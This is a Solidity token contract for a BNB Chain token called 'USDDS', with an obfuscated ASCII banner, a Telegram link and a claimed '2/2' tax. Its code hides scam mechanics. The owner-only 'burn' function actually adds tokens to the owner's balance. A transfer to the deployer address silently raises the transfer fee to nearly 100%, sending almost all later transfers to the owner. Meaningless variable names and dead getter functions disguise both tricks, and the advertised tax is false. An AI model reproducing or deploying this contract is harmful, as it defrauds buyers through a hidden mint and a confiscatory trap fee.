/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */

 /*

 ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ 
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
 ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 
                       
            Telegram:https://t.me/Crypto_HelloWorld
            Tax     :2/2
*/
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract XCWWQRV {
uint256 private  YNYOEI = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
string public  symbol = "USDDS";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  CPIKUE = 10000000000000;
uint256 private  PDKBNU = 1000000000000000000;
uint256 private  KDLVBG = 1000000000000000000;
address private  XLQTRL = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
uint256 public constant OLWPKW = 99999;
string public  name = "USDDS";
address private  VJYYGI = address(0);
uint256 private  RZNHEX = 1000000000000000000000;
address private  LGEFNH = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  VECWJX = 100000000;
mapping (address => uint256) public balanceOf;
uint256 private  BHKSRB = 10000000000;
address private  UAFUBL = address(0);
address private  HBAIYX = address(0);
function _getXLQTRL() private returns (address) {
return XLQTRL;
}

function _getVECWJX() private returns (uint256) {
return VECWJX;
}

function _getUAFUBL() private returns (address) {
return UAFUBL;
}

function _getYNYOEI() private returns (uint256) {
return YNYOEI;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBQHLRX 0");
require(spender != address(0), "fBQHLRX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BQHLRX");
require(to != address(0), "BQHLRX");
require(amount <= balanceOf[from], "BQHLRX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OLWPKW/PDKBNU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LGEFNH){
PDKBNU = OLWPKW+2;
}
emit Transfer(from, to, transferAmount);
}
function _getHBAIYX() private returns (address) {
return HBAIYX;
}

function _getVJYYGI() private returns (address) {
return VJYYGI;
}

function _getRZNHEX() private returns (uint256) {
return RZNHEX;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getKDLVBG() private returns (uint256) {
return KDLVBG;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getBHKSRB() private returns (uint256) {
return BHKSRB;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
LGEFNH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getCPIKUE() private returns (uint256) {
return CPIKUE;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}